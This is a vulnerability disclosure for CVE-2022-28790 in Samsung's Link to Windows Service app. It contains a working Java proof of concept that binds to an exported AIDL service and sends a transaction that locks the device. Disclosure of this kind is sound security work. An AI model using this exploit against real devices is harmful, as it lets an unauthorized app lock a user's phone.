# Details

<table>
    <tr>
        <td>Name</td>
        <td>Link to Windows Service</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.mdx</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.26</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.05.03</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28790">CVE-2022-28790</a> (SVE-2022-0763)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$980</td>
    </tr>
</table>

# Description

Oversecured found an exported service with exposed AIDL interfaces:
![](04%20رئيسية/Samsung%20Vulnerabilities/019.%20Link%20to%20Windows%20Service%20—%20Locking%20the%20device/Oversecured_report_1.png)
![](04%20رئيسية/Samsung%20Vulnerabilities/019.%20Link%20to%20Windows%20Service%20—%20Locking%20the%20device/Oversecured_report_2.png)

Depending on the flags transmitted, the app locked the device.

**Proof of Concept**

```java
private ServiceConnection mServiceConnection = new ServiceConnection() {
    public void onServiceConnected(ComponentName cName, IBinder service) {
        processBinder(service);
    }

    public void onServiceDisconnected(ComponentName cName) {
    }
};

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent();
    i.setClassName("com.samsung.android.mdx", "com.samsung.android.mdx.windowslink.interactor.blackscreen.BlackScreenControllerService");
    bindService(i, mServiceConnection, BIND_AUTO_CREATE);
}

private void processBinder(IBinder binder) {
    try {
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken("com.samsung.android.mdx.windowslink.interactor.blackscreen.IBlackScreenControllerService");
        parcel.writeBoolean(true);
        parcel.writeBoolean(false);

        Parcel reply = Parcel.obtain();

        binder.transact(2, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```
